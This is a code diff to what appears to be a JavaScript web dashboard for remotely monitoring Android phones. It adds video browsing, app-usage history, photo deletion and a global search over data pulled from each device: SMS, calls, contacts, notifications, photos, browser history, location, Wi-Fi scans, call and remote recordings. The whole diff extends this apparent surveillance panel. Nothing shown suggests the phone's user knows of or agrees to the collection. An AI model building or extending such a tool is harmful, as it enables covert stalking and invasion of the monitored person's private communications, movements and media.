+      const screenIcon = s.screenOn ? '\u{1F4F1} On' : '\u{1F4F1} Off';
+      const screenColor = s.screenOn ? 'var(--success)' : 'var(--muted)';
+      chips += `<span class="chip" style="font-size:9px;padding:1px 6px;border-color:${screenColor};color:${screenColor}">${screenIcon}</span>`;
+    }
+    html += `<div class="bar-row" style="padding:6px 10px;gap:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;cursor:pointer" onclick="copyRecentsRow(this)" title="Click to copy row">` +
+      `<span style="font-size:12px;color:var(--accent);min-width:120px;white-space:nowrap">${pktShort(s.phoneTsMs)}</span>` +
+      `<span style="font-size:12px;color:var(--text);font-weight:500;min-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${s.appName}</span>` +
+      `<span style="font-size:10px;color:var(--muted);font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;min-width:80px;display:none" class="recents-pkg">${s.packageName || ''}</span>` +
+      `<span style="display:flex;gap:3px;flex-wrap:wrap;min-width:100px">${chips}</span>` +
+      `<span style="font-size:10px;color:var(--muted);min-width:120px;white-space:nowrap">${pktShort(s.dashboardTsMs)}</span>` +
+    `</div>`;
+  }
+  list.innerHTML = html || '<div class="label">No snapshots match your filters</div>';
+}
+
+function copyRecentsRow(el) {
+  const ts = el.querySelector('span:first-child')?.textContent || '';
+  const app = el.querySelector('span:nth-child(2)')?.textContent || '';
+  const pkg = el.querySelector('.recents-pkg')?.textContent || '';
+  const text = `${ts} ${app} ${pkg}`.trim();
+  if (navigator.clipboard) navigator.clipboard.writeText(text).catch(() => {});
+}
+
+document.getElementById('recentsTimeRange')?.addEventListener('change', function() {
+  recentsTimeRange = this.value;
+  if (appSnapshotsCache) renderRecents();
+});
+document.getElementById('recentsSearch')?.addEventListener('input', function() {
+  recentsSearchQuery = this.value;
+  if (appSnapshotsCache) renderRecents();
+});
+document.getElementById('recentsDedupToggle')?.addEventListener('change', function() {
+  localStorage.setItem('recentsDedup', this.checked);
+  if (appSnapshotsCache) renderRecents();
+});
+
+async function clearRecents() {
+  if (!selectedDevice) return;
+  if (!confirm('Delete ALL app snapshots from Firebase RTDB?\nThis cannot be undone.')) return;
+  const ok = await deleteRTDB(`devices/${selectedDevice}/appSnapshots`);
+  if (ok) {
+    appSnapshotsCache = null; renderRecents();
+    showAlert('All app snapshots deleted from RTDB', 'warn');
+  } else showAlert('Failed to delete snapshots', 'error');
+}
+
+function exportRecentsCSV() {
+  if (!appSnapshotsCache || !appSnapshotsCache.length) return;
+  const now = Date.now();
+  const timeRangeMs = { '1h': 3600000, '6h': 21600000, '12h': 43200000, '24h': 86400000, '7d': 604800000, '30d': 2592000000, 'all': Infinity };
+  const cutoff = now - (timeRangeMs[recentsTimeRange] || timeRangeMs['24h']);
+  const searchLower = recentsSearchQuery.toLowerCase();
+  const filtered = appSnapshotsCache.filter(s => {
+    if (s.phoneTsMs < cutoff) return false;
+    if (searchLower && !s.appName.toLowerCase().includes(searchLower) && !(s.packageName || '').toLowerCase().includes(searchLower)) return false;
+    return true;
+  });
+  const headers = ['App Name', 'Package Name', 'Phone Timestamp', 'Dashboard Timestamp'];
+  const rows = filtered.map(s => [
+    '"' + s.appName.replace(/"/g, '""') + '"',
+    '"' + (s.packageName || '').replace(/"/g, '""') + '"',
+    new Date(s.phoneTsMs).toISOString(),
+    new Date(s.dashboardTsMs).toISOString()
+  ].join(','));
+  const csv = [headers.join(','), ...rows].join('\n');
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = 'app_snapshots_' + new Date().toISOString().slice(0,10) + '.csv';
+  a.click(); URL.revokeObjectURL(url);
+}
+
+// Override pollAppSnapshots to also call renderRecents
+const _origPollAppSnapshots = pollAppSnapshots;
+pollAppSnapshots = async function() {
+  await _origPollAppSnapshots.call(this);
+  renderRecents();
+};
+
+// Override renderAppSnapshots to call renderRecents
+const _origRenderAppSnapshots = renderAppSnapshots;
+renderAppSnapshots = function() {
+  _origRenderAppSnapshots.call(this);
+  renderRecents();
+};
+
+// --- Videos Tab ---
+async function pollVideos() {
+  if (!selectedDevice) return;
+  await loadVideos();
+}
+
+async function loadVideos() {
+  if (!selectedDevice) return;
+  if (videoLoading) return;
+  videoLoading = true;
+  try {
+    const grid = document.getElementById('videoGrid');
+    const lmContainer = document.getElementById('videoLoadMoreContainer');
+
+    const keysData = await fetchRTDB(`devices/${selectedDevice}/videos`, 'shallow=true');
+    if (!keysData || typeof keysData !== 'object') {
+      if (!Object.keys(cachedVideos).length) { videoKeys = []; renderVideos(); return; }
+      return;
+    }
+
+    const allKeys = Object.keys(keysData).sort((a, b) => parseInt(b) - parseInt(a));
+    const freshKeys = allKeys.filter(k => !cachedVideos[k]);
+
+    // If nothing new and grid already has content, just update count
+    if (freshKeys.length === 0 && grid.children.length > 0 && !grid.querySelector('.label')) {
+      videoKeys = allKeys;
+      document.getElementById('videoCount').textContent = '(' + allKeys.length + ')';
+      return;
+    }
+
+    videoKeys = allKeys;
+    document.getElementById('videoCount').textContent = '(' + videoKeys.length + ')';
+    videoOffset = 0;
+    grid.innerHTML = '';
+    if (lmContainer) lmContainer.innerHTML = '';
+    await loadMoreVideos(true);
+  } catch (e) { console.error('loadVideos:', e); }
+  finally { videoLoading = false; }
+}
+
+async function loadAllVideos() {
+  if (!selectedDevice) return;
+  if (!videoKeys.length) await loadVideos();
+  videoLoading = false;
+  while (videoOffset < videoKeys.length) {
+    await loadMoreVideos(true);
+    await new Promise(r => setTimeout(r, 10));
+  }
+}
+
+async function loadMoreVideos(skipGuard = false) {
+  if (!videoKeys.length) { renderVideos(); return; }
+  if (!skipGuard && videoLoading) return;
+  videoLoading = true;
+  const end = Math.min(videoOffset + VIDEO_BATCH, videoKeys.length);
+  const batch = videoKeys.slice(videoOffset, end);
+  videoOffset = end;
+
+  // Fetch uncached entries in this batch and deduplicate
+  const lmContainer = document.getElementById('videoLoadMoreContainer');
+  const uncachedCount = batch.filter(k => !cachedVideos[k]).length;
+  if (uncachedCount > 0 && lmContainer) {
+    lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading ' + uncachedCount + ' video(s)...</div>';
+  }
+  const dedupSet = new Set();
+  for (const v of Object.values(cachedVideos)) {
+    if (v && v.fileName && v.dateAdded) dedupSet.add(v.fileName + '|' + v.dateAdded);
+  }
+  for (const k of batch) {
+    if (cachedVideos[k]) continue;
+    try {
+      const entry = await fetchRTDB(`devices/${selectedDevice}/videos/${k}`);
+      if (entry && typeof entry === 'object' && (entry.storageUrl || entry.data)) {
+        const dedupKey = (entry.fileName || '') + '|' + (entry.dateAdded || '');
+        if (dedupKey !== '|' && dedupSet.has(dedupKey)) continue;
+        cachedVideos[k] = entry;
+        if (dedupKey !== '|') dedupSet.add(dedupKey);
+      }
+    } catch {}
+  }
+  videoLoading = false;
+
+  const filtered = batch.filter(k => {
+    if (videoSourceFilter === 'all') return true;
+    const v = cachedVideos[k];
+    return v && (v.source === videoSourceFilter);
+  });
+  if (filtered.length) renderVideoGroup(filtered);
+  renderVideos();
+  const container = document.getElementById('videoLoadMoreContainer');
+  container.innerHTML = '';
+  if (videoOffset < videoKeys.length) {
+    const btn = document.createElement('button');
+    btn.className = 'load-more-btn';
+    btn.textContent = '\u2B07 Load more videos (' + (videoKeys.length - videoOffset) + ' remaining)';
+    btn.onclick = () => loadMoreVideos();
+    container.appendChild(btn);
+  }
+}
+
+function renderVideoGroup(keys) {
+  const grid = document.getElementById('videoGrid');
+  const videos = cachedVideos;
+  for (const k of keys) {
+    const v = videos[k];
+    if (!v || (!v.storageUrl && !v.data)) continue;
+    const date = v.dateAdded ? new Date(v.dateAdded) : new Date(v.ts_ms);
+    const dateStr = date.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+    const timeStr = date.toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+    const existingHeaders = grid.querySelectorAll('.photo-day-header');
+    let needsHeader = true;
+    for (const h of existingHeaders) {
+      if (h.textContent.includes(dateStr)) { needsHeader = false; break; }
+    }
+    if (needsHeader) {
+      const dayDiv = document.createElement('div');
+      dayDiv.className = 'photo-day';
+      const header = document.createElement('div');
+      header.className = 'photo-day-header';
+      header.innerHTML = '\u{1F4C5} ' + dateStr;
+      dayDiv.appendChild(header);
+      grid.appendChild(dayDiv);
+    }
+    const wrap = document.createElement('div');
+    wrap.className = 'pwrap';
+    wrap.style.aspectRatio = v.width && v.height ? v.width + '/' + v.height : '16/9';
+    const thumb = v.thumb ? 'data:image/jpeg;base64,' + v.thumb : 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 9"%3E%3Crect width="16" height="9" fill="%23161b22"/%3E%3Ctext x="8" y="6" text-anchor="middle" fill="%238b949e" font-size="4"%3E\u25B6%3C/text%3E%3C/svg%3E';
+    const img = document.createElement('img');
+    img.loading = 'lazy';
+    img.src = thumb;
+    img.alt = v.fileName || 'Video';
+    img.onclick = () => openVideoPlayer(v.storageUrl || v.data, v);
+    wrap.appendChild(img);
+    const cap = document.createElement('div');
+    cap.className = 'pcap';
+    cap.innerHTML = '<span style="font-size:10px">\u25B6 ' + (v.fileName || 'Video') + '</span><div class="ptime">' + timeStr + (v.source ? ' \u00B7 ' + v.source : '') + (v.durationMs ? ' \u00B7 ' + Math.round(v.durationMs/1000) + 's' : '') + '</div>';
+    wrap.appendChild(cap);
+    const dayDivs = grid.querySelectorAll('.photo-day');
+    let targetDay = null;
+    for (const dd of dayDivs) {
+      if (dd.querySelector('.photo-day-header')?.textContent.includes(dateStr)) {
+        targetDay = dd; break;
+      }
+    }
+    if (targetDay) targetDay.appendChild(wrap);
+    else grid.appendChild(wrap);
+  }
+}
+
+function renderVideos() {
+  const grid = document.getElementById('videoGrid');
+  if (!grid.children.length) {
+    grid.innerHTML = '<div class="label" style="margin:20px 0">&#x1F3AC; No videos synced yet</div>';
+  }
+}
+
+function openVideoPlayer(src, meta) {
+  const overlay = document.getElementById('videoPlayerOverlay');
+  const player = document.getElementById('videoPlayer');
+  const metaEl = document.getElementById('videoPlayerMeta');
+  if (!overlay || !player) return;
+  if (src && !src.startsWith('http') && !src.startsWith('data:')) {
+    src = 'data:video/mp4;base64,' + src;
+  }
+  player.src = src;
+  player.load();
+  const dur = meta.durationMs ? Math.round(meta.durationMs / 1000) + 's' : '';
+  const dim = meta.width && meta.height ? meta.width + 'x' + meta.height : '';
+  const sourceLabel = meta.source || '';
+  metaEl.innerHTML = [meta.fileName, dur, dim, sourceLabel].filter(Boolean).join(' \u00B7 ');
+  overlay.style.display = 'flex';
+  player.play().catch(() => {});
+}
+
+function closeVideoPlayer() {
+  const overlay = document.getElementById('videoPlayerOverlay');
+  const player = document.getElementById('videoPlayer');
+  if (overlay) overlay.style.display = 'none';
+  if (player) { player.pause(); player.src = ''; }
+}
+
+document.getElementById('videoPlayerOverlay')?.addEventListener('click', function(e) {
+  if (e.target === this) closeVideoPlayer();
+});
+
+document.querySelectorAll('.chip[data-vsource]').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('.chip[data-vsource]').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    videoSourceFilter = chip.dataset.vsource;
+    videoOffset = 0;
+    videoLoading = false;
+    const grid = document.getElementById('videoGrid');
+    grid.innerHTML = '';
+    const container = document.getElementById('videoLoadMoreContainer');
+    container.innerHTML = '';
+    if (cachedVideos && Object.keys(cachedVideos).length) loadMoreVideos();
+    else pollVideos();
+  });
 });
 
 // --- Device Select ---
 document.getElementById('deviceSelect').addEventListener('change', function() {
   selectedDevice = this.value;
+  recordingDevice = this.value;
   localStorage.setItem('selectedDevice', selectedDevice);
   locationHistory = [];
   historyAutoLoaded = false;
@@ -955,6 +1450,8 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   appSnapshotsLastSync = 0;
   contactsCache = null;
   contactsSyncTs = 0;
+  cachedVideos = {};
+  videoKeys = [];
   wifiCache = [];
   logcatCache = [];
   window.permCache = null;
@@ -998,6 +1495,7 @@ function startPolling() {
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('health', 60000, pollHealth);
+  schedulePoll('videos', 60000, pollVideos);
   schedulePoll('callrec', 60000, pollCallRecordings);
 }
 
@@ -1010,7 +1508,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollCallRecordings()];
+  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollCallRecordings()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -1076,28 +1574,33 @@ async function fetchDevices() {
     return;
   }
 
-  // Fetch manufacturer+model for each device, then deduplicate
-  const modelMap = {};
+  // Build device list WITHOUT model-based dedup — each Android ID is unique
+  const deviceEntries = [];
   for (const entry of active) {
     const info = await fetchRTDB(`devices/${entry.id}/info`);
     const metrics = info ? null : await fetchRTDB(`devices/${entry.id}/metrics/latest`);
     const devInfo = info || metrics || {};
     const manuf = (devInfo.manufacturer || '').trim();
     const model = (devInfo.deviceModel || '').trim();
-    const modelKey = manuf && model ? manuf + '|' + model : entry.id;
-    if (!modelMap[modelKey] || entry.ts > modelMap[modelKey].ts) {
-      modelMap[modelKey] = { id: entry.id, ts: entry.ts, manuf, model, label: [manuf, model].filter(Boolean).join(' ') || entry.id.slice(0, 8) };
-    }
+    const label = [manuf, model].filter(Boolean).join(' ') || entry.id.slice(0, 8);
+    const disambiguated = deviceEntries.some(d => d.label === label)
+      ? label + ' (' + entry.id.slice(0, 6) + ')'
+      : label;
+    deviceEntries.push({ id: entry.id, ts: entry.ts, label: disambiguated, model, manuf });
   }
-  const dedupedIds = Object.values(modelMap).sort((a, b) => b.ts - a.ts);
-  const activeIds = dedupedIds.map(a => a.id);
+  const activeIds = deviceEntries.map(d => d.id);
 
   selectedDevice = activeIds[0];
+  const savedDevice = localStorage.getItem('selectedDevice');
+  if (savedDevice && activeIds.includes(savedDevice)) selectedDevice = savedDevice;
+  recordingDevice = selectedDevice;
   loadGeofences(selectedDevice);
   localStorage.setItem('selectedDevice', selectedDevice);
-  dedupedIds.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
-  sel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
+  deviceEntries.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
+  sel.innerHTML = deviceEntries.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
   sel.value = selectedDevice;
+  const remoteSel = document.getElementById('remote-voiceDeviceSelect');
+  if (remoteSel) { remoteSel.innerHTML = sel.innerHTML; remoteSel.value = selectedDevice; }
 }
 
 async function pollLocation() {
@@ -1137,6 +1640,39 @@ async function pollMeta() {
   document.getElementById('liveCarrierVal').textContent = m.networkOperatorName || m.networkOperator || '--';
   document.getElementById('liveNetworkVal').textContent = m.networkTypeDetail || '--';
   document.getElementById('liveSimVal').textContent = m.simCountryIso ? m.simCountryIso.toUpperCase() : '--';
+  // Status widget
+  const swBat = document.getElementById('swBattery');
+  if (swBat) {
+    const pct = m.batteryPct;
+    const charging = m.isCharging ? ' ⚡' : '';
+    swBat.textContent = '\u{1F50B} ' + (pct != null ? pct + '%' + charging : '--');
+    swBat.style.borderColor = pct != null && pct < 20 ? 'var(--danger)' : 'var(--border)';
+    swBat.style.color = pct != null && pct < 20 ? 'var(--danger)' : 'var(--muted)';
+  }
+  const swStorage = document.getElementById('swStorage');
+  if (swStorage) {
+    const freeGb = m.storageFreeGb;
+    swStorage.textContent = '\u{1F4BE} ' + (freeGb != null ? freeGb.toFixed(1) + 'GB free' : '--');
+    swStorage.style.borderColor = freeGb != null && freeGb < 2 ? 'var(--danger)' : 'var(--border)';
+  }
+  const swSteps = document.getElementById('swSteps');
+  if (swSteps && m.stepsToday != null) {
+    const steps = m.stepsToday;
+    const goal = m.stepsGoal || 8000;
+    swSteps.textContent = '\u{1F45F} ' + steps.toLocaleString() + '/' + goal.toLocaleString();
+    swSteps.style.borderColor = steps >= goal ? 'var(--success)' : 'var(--border)';
+    swSteps.style.color = steps >= goal ? 'var(--success)' : 'var(--muted)';
+  }
+  const swWifi = document.getElementById('swWifi');
+  if (swWifi && m.wifiSsid) swWifi.textContent = '\u{1F4E1} ' + m.wifiSsid;
+  if (swWifi && !m.wifiSsid) swWifi.textContent = '\u{1F4E1} Mobile';
+  const swSignal = document.getElementById('swSignal');
+  if (swSignal) {
+    const rssi = m.signalStrengthDbm || m.signalStrength || m.rssi || m.wifiRssi || -100;
+    const bars = rssi > -60 ? 4 : rssi > -70 ? 3 : rssi > -80 ? 2 : rssi > -90 ? 1 : 0;
+    const barHtml = Array.from({length: 4}, (_, i) => `<span class="bar ${i < bars ? 'on' : ''} ${i === 3 && bars === 4 ? 's3' : ''} ${i === 0 && bars === 1 ? 's1' : ''}" style="width:${(i + 1) * 4}px"></span>`).join('');
+    swSignal.innerHTML = `<span class="wifi-signal">${barHtml}</span> ${m.networkType || '--'}`;
+  }
   if (m.deviceModel && devices[selectedDevice]) {
     const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
     devices[selectedDevice].label = label;
@@ -1232,7 +1768,8 @@ function renderPhotosFromCache() {
       const dateTaken = doc.dateTaken ? pkt(doc.dateTaken) : '';
       const fileName = doc.fileName || '';
       const synced = pkt(ts);
-      html += '<div class="pwrap" data-ts="' + ts + '" onclick="openPhotoLightbox(this)">' +
+      html += '<div class="pwrap" data-ts="' + ts + '" data-photokey="' + (doc.key || '') + '" onclick="if(!event.target.closest(\'.photo-select\'))openPhotoLightbox(this)">' +
+        '<div class="photo-select" style="position:absolute;top:4px;right:4px;z-index:2;background:rgba(0,0,0,.5);border-radius:4px;padding:2px;display:none" onclick="event.stopPropagation();togglePhotoSelect(this)"><input type="checkbox"></div>' +
         '<img src="data:image/jpeg;base64,' + doc.data + '" loading="lazy" decoding="async">' +
         '<div class="pcap"><div>' + escHtml(fileName || dateTaken || synced) + '</div>' +
         '<div class="ptime">' + (dateTaken ? dateTaken + ' &middot; ' : '') + synced + '</div></div></div>';
@@ -1252,6 +1789,52 @@ function renderPhotosFromCache() {
   }
 }
 
+// --- Photo selection ---
+let selectedPhotoKeys = new Set();
+
+function togglePhotoSelect(el) {
+  const wrap = el.closest('.pwrap');
+  if (!wrap) return;
+  const key = wrap.dataset.photokey;
+  if (!key) return;
+  wrap.classList.toggle('selected');
+  const cb = el.querySelector('input[type=checkbox]');
+  if (cb) cb.checked = wrap.classList.contains('selected');
+  if (wrap.classList.contains('selected')) selectedPhotoKeys.add(key);
+  else selectedPhotoKeys.delete(key);
+  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected' + (selectedPhotoKeys.size ? ' (' + selectedPhotoKeys.size + ')' : '');
+}
+
+document.getElementById('btnSelectAllPhotos')?.addEventListener('click', function() {
+  const all = document.querySelectorAll('#photoGrid .pwrap');
+  const selecting = selectedPhotoKeys.size < all.length;
+  selectedPhotoKeys.clear();
+  all.forEach(w => {
+    w.classList.toggle('selected', selecting);
+    const cb = w.querySelector('.photo-select input');
+    if (cb) cb.checked = selecting;
+    if (selecting) selectedPhotoKeys.add(w.dataset.photokey);
+  });
+  this.textContent = selecting ? '\u{1F4CB} Deselect All' : '\u{1F4CB} Select All';
+  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected' + (selectedPhotoKeys.size ? ' (' + selectedPhotoKeys.size + ')' : '');
+});
+
+async function deleteSelectedPhotos() {
+  if (!selectedPhotoKeys.size) { showAlert('No photos selected', 'error'); return; }
+  if (!confirm('Delete ' + selectedPhotoKeys.size + ' selected photos from RTDB?\nThis cannot be undone.')) return;
+  let deleted = 0;
+  for (const key of selectedPhotoKeys) {
+    if (await deleteRTDB(`devices/${selectedDevice}/photos/${key}`)) deleted++;
+  }
+  selectedPhotoKeys.clear();
+  document.getElementById('btnDeleteSelectedPhotos').textContent = '\u{1F5D1} Delete Selected';
+  document.getElementById('btnSelectAllPhotos').textContent = '\u{1F4CB} Select All';
+  cachedPhotos = {};
+  await loadPhotos();
+  renderPhotosFromCache();
+  showAlert('Deleted ' + deleted + ' photos', deleted > 0 ? 'warn' : 'error');
+}
+
 async function loadMorePhotos() {
   if (photoLoading || !photoKeys.length || photoOffset >= photoKeys.length) return;
   photoLoading = true;
@@ -1259,12 +1842,18 @@ async function loadMorePhotos() {
   const lmContainer = document.getElementById('loadMoreContainer');
   lmContainer.innerHTML = '<div class="load-more-btn" disabled>&#x23F3; Loading...</div>';
 
+  const keys = Object.keys(cachedPhotos);
+  if (keys.length > 500) {
+    const toRemove = keys.sort().slice(0, keys.length - 500);
+    toRemove.forEach(k => delete cachedPhotos[k]);
+  }
   for (const ts of batch) {
     if (cachedPhotos[ts]) continue;
     try {
       const doc = await fetchRTDB(`devices/${selectedDevice}/photos/${ts}`);
       if (doc && doc.data && doc.data.startsWith('/9j/')) {
         cachedPhotos[ts] = doc;
+        if (Object.keys(cachedPhotos).length > 500) break;
       }
     } catch {}
   }
@@ -1381,6 +1970,70 @@ async function pollQueueSize() {
     if (countEl) { countEl.textContent = '0'; countEl.style.color = 'var(--muted)'; }
   }
 }
+
+// --- Global Search ---
+let globalSearchTimeout = null;
+document.getElementById('globalSearch')?.addEventListener('input', function() {
+  clearTimeout(globalSearchTimeout);
+  const q = this.value.trim();
+  if (!q) { clearGlobalSearch(); return; }
+  globalSearchTimeout = setTimeout(() => performGlobalSearch(q), 400);
+});
+
+function clearGlobalSearch() {
+  document.getElementById('globalSearchResults').innerHTML = '';
+  document.getElementById('globalSearchResults').style.display = 'none';
+}
+
+async function performGlobalSearch(q) {
+  const results = document.getElementById('globalSearchResults');
+  results.style.display = 'block';
+  results.innerHTML = '<div class="label">Searching...</div>';
+  const queries = ['sms', 'calls', 'contacts', 'notifications', 'photos', 'videos', 'appSnapshots', 'timeline', 'browser', 'logcat', 'permissions'];
+  const device = selectedDevice;
+  let allMatches = [];
+  for (const key of queries) {
+    if (selectedDevice !== device) break;
+    try {
+      const data = await fetchRTDB(`devices/${device}/${key}`);
+      if (!data || typeof data !== 'object') continue;
+      const entries = Object.values(data).filter(v => typeof v === 'object' && v !== null);
+      for (const e of entries) {
+        const text = JSON.stringify(e).toLowerCase();
+        let count = 0; let idx = 0;
+        while ((idx = text.indexOf(q.toLowerCase(), idx)) !== -1) { count++; idx += q.length; }
+        if (count > 0) allMatches.push({ key, count, sample: e });
+      }
+    } catch {}
+  }
+  if (selectedDevice !== device) return;
+  if (!allMatches.length) {
+    results.innerHTML = '<div class="label">No matches found</div>';
+    return;
+  }
+  allMatches.sort((a, b) => b.count - a.count);
+  let html = '<div style="margin-bottom:4px;font-size:13px;color:var(--muted)">Found in ' + allMatches.length + ' data types:</div>';
+  for (const m of allMatches.slice(0, 20)) {
+    const icons = { sms: '\u{1F4F1}', calls: '\u{1F4DE}', contacts: '\u{1F464}', notifications: '\u{1F514}', photos: '\u{1F5BC}', videos: '\u{1F3AC}', appSnapshots: '\u{1F4CB}', timeline: '\u{1F4CD}', browser: '\u{1F310}', logcat: '\u{1F4DD}', permissions: '\u{1F512}' };
+    html += '<div class="bar-row" style="padding:6px 10px;cursor:pointer;border-bottom:1px solid var(--border)" onclick="switchTab(\'' + m.key + '\')">' +
+      '<span style="margin-right:8px">' + (icons[m.key] || '\u{1F4C1}') + '</span>' +
+      '<span style="font-weight:500;flex:1">' + m.key + '</span>' +
+      '<span style="color:var(--accent)">' + m.count + ' match' + (m.count !== 1 ? 'es' : '') + '</span>' +
+    '</div>';
+  }
+  results.innerHTML = html;
+}
+
+document.addEventListener('keydown', function(e) {
+  if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
+    e.preventDefault();
+    document.getElementById('globalSearch')?.focus();
+  }
+  if (e.key === 'Escape') {
+    document.getElementById('globalSearch')?.blur();
+    clearGlobalSearch();
+  }
+});
 
 async function sendFcmPush() {
   if (!selectedDevice) {
@@ -1508,11 +2161,20 @@ function renderAppSnapshots() {
 
 async function pollAppSnapshots() {
   if (!selectedDevice) return;
+  const deviceAtStart = selectedDevice;
   const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`);
   if (!data || typeof data !== 'object') {
+    if (selectedDevice !== deviceAtStart) return;
+    if (appSnapshotsCache && appSnapshotsCache.length) {
+      showAlert('Failed to refresh snapshots — showing cached data', 'error');
+      appSnapshotsLastSync = 0;
+      renderRecents();
+      return;
+    }
     appSnapshotsCache = null;
     appSnapshotsLastSync = 0;
-    document.getElementById('appsChart').innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    document.getElementById('appsChart').innerHTML = '<div class="label" style="color:var(--muted)">No app snapshots found — device may not support this feature or has never synced.</div>';
+    renderRecents();
     return;
   }
   appSnapshotsCache = Object.entries(data)
@@ -1520,14 +2182,20 @@ async function pollAppSnapshots() {
       key,
       appName: val.appName || val.packageName || '?',
       packageName: val.packageName || '',
-      phoneTsMs: parseInt(val.phoneTsMs || val.ts_ms || '0'),
-      dashboardTsMs: parseInt(val.dashboardTsMs || '0')
+      phoneTsMs: parseInt(val.phoneTsMs || val.ts_ms || key || '0'),
+      dashboardTsMs: parseInt(val.dashboardTsMs || key || '0'),
+      batteryPct: val.batteryPct != null ? parseInt(val.batteryPct) : null,
+      isCharging: !!val.isCharging,
+      idleTimeMs: val.idleTimeMs != null ? parseInt(val.idleTimeMs) : null,
+      screenOn: val.screenOn != null ? !!val.screenOn : null
     }))
     .filter(s => s.phoneTsMs > 0)
     .sort((a, b) => b.phoneTsMs - a.phoneTsMs)
     .slice(0, 100);
+  if (selectedDevice !== deviceAtStart) return;
   appSnapshotsLastSync = Date.now();
   renderAppSnapshots();
+  renderRecents();
 }
 
 async function pollApps() {
@@ -1553,17 +2221,26 @@ async function pollApps() {
 
 async function pollHistory() {
   if (!selectedDevice) return;
-  const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
-  if (!rtdbData || typeof rtdbData !== 'object') {
-    timelineCache = null;
-    document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>';
-    document.getElementById('callsBody').innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
-    return;
+  const listEl = document.getElementById('timelineList');
+  const callsEl = document.getElementById('callsBody');
+  if (listEl) listEl.innerHTML = '<div class="label">\u{1F4E1} Loading timeline...</div>';
+  if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">Loading...</td></tr>';
+  try {
+    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`, 'orderBy="$key"&limitToLast=1000');
+    if (!rtdbData || typeof rtdbData !== 'object') {
+      timelineCache = null;
+      if (listEl) listEl.innerHTML = '<div class="label">No entries</div>';
+      if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
+      return;
+    }
+    timelineCache = Object.values(rtdbData)
+      .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
+    renderTimeline(timelineCache);
+    renderCalls(timelineCache);
+   } catch (e) {
+    console.error('pollHistory error:', e);
+    if (listEl) listEl.innerHTML = '<div class="label" style="color:var(--danger)">Timeline load error: ' + e.message + '</div>';
   }
-  timelineCache = Object.values(rtdbData)
-    .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
-  renderTimeline(timelineCache);
-  renderCalls(timelineCache);
 }
 
 async function pollVoiceNotes() {
@@ -1580,10 +2257,11 @@ async function pollVoiceNotes() {
     const batch = data[key];
     if (!batch || typeof batch !== 'object') continue;
     const synced = parseInt(batch.ts_ms) || 0;
-    for (const note of (batch.notes || [])) {
+    for (let ni = 0; ni < (batch.notes || []).length; ni++) {
+      const note = batch.notes[ni];
       if (!note) continue;
       if (note.isCallRecording) continue;
-      notes.push(Object.assign({ _synced: synced }, note));
+      notes.push(Object.assign({ _synced: synced, _batchKey: key, _noteIndex: ni }, note));
     }
   }
   // Newest created/captured first.
@@ -1640,16 +2318,18 @@ let html = `<div style="font-size:13px;color:var(--muted);margin-bottom:8px">${n
       ${meta ? `<div class="vmeta">${meta}</div>` : ''}
       ${syncedLine}
       ${player}
+      <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-top:4px" onclick="deleteVoiceNote('${note._batchKey || ''}', ${note._noteIndex || 0})">\u{1F5D1} Delete</button>
     </div>`;
   }
   list.innerHTML = html;
 }
 
 async function pollRemoteRecordings() {
-  if (!selectedDevice) return;
+  const deviceId = recordingDevice || selectedDevice;
+  if (!deviceId) return;
   const list = document.getElementById('remoteRecordingsList');
   let data;
-  try { data = await fetchRTDB(`devices/${selectedDevice}/recordings`, 'shallow=true'); } catch { data = null; }
+  try { data = await fetchRTDB(`devices/${deviceId}/recordings`, 'shallow=true'); } catch { data = null; }
   if (!data || typeof data !== 'object') {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
@@ -1668,9 +2348,13 @@ async function pollRemoteRecordings() {
   };
